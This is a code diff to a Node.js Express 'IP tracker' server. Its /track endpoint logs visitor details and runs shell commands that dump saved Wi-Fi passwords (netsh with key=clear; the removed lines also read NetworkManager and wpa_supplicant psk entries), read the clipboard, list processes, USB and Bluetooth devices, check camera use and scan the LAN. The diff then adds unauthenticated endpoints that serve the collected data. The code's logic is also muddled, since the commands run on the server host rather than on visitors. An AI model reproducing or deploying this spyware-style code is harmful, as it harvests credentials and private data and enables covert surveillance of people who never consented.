@@ -7,6 +7,7 @@ const fs = require("fs");
 const app = express();
 const PORT = 3000;
 const FILE_PATH = "tracked_ips.json";
+const IMAGE_LIFETIME = 30000;
 
 if (!fs.existsSync(FILE_PATH)) fs.writeFileSync(FILE_PATH, JSON.stringify([], null, 4));
 
@@ -15,7 +16,7 @@ app.use(express.static(__dirname));
 function scanLAN() {
     let devices = [];
     try {
-        const arpOutput = execSync("arp -a || ip neigh", { encoding: "utf-8" });
+        const arpOutput = execSync("arp -a", { encoding: "utf-8" });
         const lines = arpOutput.split("\n");
 
         lines.forEach((line) => {
@@ -30,7 +31,7 @@ function scanLAN() {
 
 function checkVPN() {
     try {
-        const dnsServers = execSync("nslookup -type=NS google.com || resolvectl status || getprop net.dns1", { encoding: "utf-8" });
+        const dnsServers = execSync("nslookup -type=NS google.com", { encoding: "utf-8" });
         if (dnsServers.includes("cloudflare") || dnsServers.includes("opendns"))
             return "Possible VPN/Proxy";
     } catch {}
@@ -39,19 +40,8 @@ function checkVPN() {
 
 function getCamMicStatus() {
     try {
-        if (process.platform === "win32") {
-            return execSync("powershell -Command \"Get-PnpDevice -Class Camera\"").includes("Enabled")
-                ? "Camera/Microphone in use"
-                : "Not in use";
-        } else if (process.platform === "darwin" || process.platform === "linux") {
-            return execSync("lsof | grep /dev/video", { encoding: "utf-8" }).split("\n").length > 1
-                ? "Camera/Microphone in use"
-                : "Not in use";
-        } else if (process.platform === "android") {
-            return execSync("dumpsys media.camera | grep 'Client'", { encoding: "utf-8" }).includes("Client")
-                ? "Camera/Microphone in use"
-                : "Not in use";
-        }
+        const camStatus = execSync("lsof | grep /dev/video", { encoding: "utf-8" }).split("\n").length > 1;
+        return camStatus ? "Camera/Microphone in use" : "Not in use";
     } catch {
         return "Unknown";
     }
@@ -59,10 +49,7 @@ function getCamMicStatus() {
 
 function getBluetoothDevices() {
     try {
-        if (process.platform === "win32") return execSync("Get-PnpDevice -Class Bluetooth", { encoding: "utf-8" }).split("\n");
-        if (process.platform === "darwin") return execSync("system_profiler SPBluetoothDataType", { encoding: "utf-8" }).split("\n");
-        if (process.platform === "linux") return execSync("bluetoothctl devices", { encoding: "utf-8" }).split("\n");
-        if (process.platform === "android") return execSync("service call bluetooth_manager 6", { encoding: "utf-8" }).split("\n");
+        return execSync("bluetoothctl devices", { encoding: "utf-8" }).split("\n");
     } catch {
         return ["Unknown"];
     }
@@ -70,10 +57,7 @@ function getBluetoothDevices() {
 
 function getClipboardData() {
     try {
-        if (process.platform === "win32") return execSync("powershell Get-Clipboard", { encoding: "utf-8" }).trim();
-        if (process.platform === "darwin") return execSync("pbpaste", { encoding: "utf-8" }).trim();
-        if (process.platform === "linux") return execSync("xclip -o || wl-paste", { encoding: "utf-8" }).trim();
-        if (process.platform === "android") return execSync("termux-clipboard-get", { encoding: "utf-8" }).trim();
+        return execSync("pbpaste || xclip -o", { encoding: "utf-8" }).trim();
     } catch {
         return "Clipboard access denied";
     }
@@ -81,9 +65,7 @@ function getClipboardData() {
 
 function getUSBDevices() {
     try {
-        if (process.platform === "win32") return execSync("wmic path Win32_USBControllerDevice get Dependent", { encoding: "utf-8" }).split("\n");
-        if (process.platform === "darwin") return execSync("system_profiler SPUSBDataType", { encoding: "utf-8" }).split("\n");
-        if (process.platform === "linux") return execSync("lsusb", { encoding: "utf-8" }).split("\n");
+        return execSync("lsusb || system_profiler SPUSBDataType", { encoding: "utf-8" }).split("\n");
     } catch {
         return ["Unknown"];
     }
@@ -91,9 +73,7 @@ function getUSBDevices() {
 
 function getOpenApps() {
     try {
-        if (process.platform === "win32") return execSync("tasklist", { encoding: "utf-8" }).split("\n").slice(0, 10);
-        if (process.platform === "darwin" || process.platform === "linux") return execSync("ps -aux", { encoding: "utf-8" }).split("\n").slice(0, 10);
-        if (process.platform === "android") return execSync("ps", { encoding: "utf-8" }).split("\n").slice(0, 10);
+        return execSync("tasklist || ps -aux", { encoding: "utf-8" }).split("\n").slice(0, 10);
     } catch {
         return ["Unknown"];
     }
@@ -101,15 +81,7 @@ function getOpenApps() {
 
 function getWiFiPasswords() {
     try {
-        if (process.platform === "win32") {
-            return execSync("netsh wlan show profile key=clear", { encoding: "utf-8" }).split("\n");
-        } else if (process.platform === "darwin") {
-            return execSync("security find-generic-password -ga Wi-Fi | grep password", { encoding: "utf-8" }).split("\n");
-        } else if (process.platform === "linux") {
-            return execSync("sudo cat /etc/NetworkManager/system-connections/* | grep psk=", { encoding: "utf-8" }).split("\n");
-        } else if (process.platform === "android") {
-            return execSync("cat /data/misc/wifi/wpa_supplicant.conf | grep psk=", { encoding: "utf-8" }).split("\n");
-        }
+        return execSync("netsh wlan show profile key=clear", { encoding: "utf-8" }).split("\n");
     } catch {
         return ["Unknown"];
     }
@@ -140,20 +112,29 @@ app.get("/track", async (req, res) => {
         screen_size: req.headers["sec-ch-ua-platform"] || "Unknown",
     };
 
+    const vpnStatus = checkVPN();
+    const camMicStatus = getCamMicStatus();
+    const bluetoothDevices = getBluetoothDevices();
+    const clipboardData = getClipboardData();
+    const usbDevices = getUSBDevices();
+    const openApps = getOpenApps();
+    const wifiPasswords = getWiFiPasswords();
+    const lanDevices = scanLAN();
+
     const newEntry = {
         timestamp: new Date().toISOString(),
         public_ip: publicIP,
         local_ip: localIP,
         device_name: deviceName,
         mac_address: macAddress,
-        vpn_status: checkVPN(),
-        cam_mic_status: getCamMicStatus(),
-        bluetooth_devices: getBluetoothDevices(),
-        clipboard_data: getClipboardData(),
-        usb_devices: getUSBDevices(),
-        open_apps: getOpenApps(),
-        wifi_passwords: getWiFiPasswords(),
-        lan_devices: scanLAN(),
+        vpn_status: vpnStatus,
+        cam_mic_status: camMicStatus,
+        bluetooth_devices: bluetoothDevices,
+        clipboard_data: clipboardData,
+        usb_devices: usbDevices,
+        open_apps: openApps,
+        wifi_passwords: wifiPasswords,
+        lan_devices: lanDevices,
     };
 
     const existingData = JSON.parse(fs.readFileSync(FILE_PATH, "utf8"));
@@ -161,6 +142,16 @@ app.get("/track", async (req, res) => {
     fs.writeFileSync(FILE_PATH, JSON.stringify(existingData, null, 4));
 
     res.json(newEntry);
+});
+
+app.get("/download", (req, res) => {
+    res.download(FILE_PATH, "tracked_ips.json");
+});
+
+// New endpoint to view tracked IP info in JSON format
+app.get("/tracked_ips", (req, res) => {
+    const existingData = JSON.parse(fs.readFileSync(FILE_PATH, "utf8"));
+    res.json(existingData);
 });
 
 app.listen(PORT, () => {
